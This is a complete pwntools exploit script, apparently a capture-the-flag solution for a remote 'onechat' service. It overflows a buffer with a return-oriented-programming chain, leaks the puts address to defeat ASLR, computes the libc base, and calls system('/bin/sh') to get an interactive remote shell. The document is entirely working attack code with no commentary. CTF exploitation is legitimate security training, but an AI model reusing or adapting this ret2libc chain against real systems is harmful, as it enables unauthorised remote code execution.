from os import system
from pwn import *
import time
from codecs import encode

# context.log_level = 'debug'

puts_got = 0x404028
puts_plt = 0x401050
pop_rdi = 0x4017bb
pop4ret = 0x4017b4
one = 0xccc1a
main = 0x4012e5
puts_off = 0x7e6f0
system_off = 0x4fa40
binsh = 0x1c126a
ret = 0x401754

# p = process('./task/chat')
# p = remote('localhost', 1337)
p = remote('onechat.ctfz.one', 1337)
p.recvuntil(b'> ')

ex = b'B'*22 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret) + p64(main) + b'A'*64 + p64(pop4ret) + p64(puts_got) + p64(puts_plt) + p64(main) #10

p.sendline(b'2')
p.recvuntil(b'> ')
p.sendline(b'')
p.recvuntil(b'> ')
p.sendline(ex)

libc = int(encode(p.recvline().strip()[::-1],'hex'), 16) - puts_off
# print(hex(libc))

p.recvuntil(b'> ')

p.sendline(b'')
p.recvuntil(b'> ')
# p.sendline('B'*22 + p64(pop_rdi) + p64(libc+binsh) + p64(libc+system_off) + p64(ret) + p64(main) + 'A'*64 + p64(pop4ret) + p64(puts_got) + p64(puts_plt) + p64(main))
p.sendline(b'A'*126+p64(ret)+p64(pop_rdi)+p64(binsh+libc)+p64(libc+system_off))


p.interactive()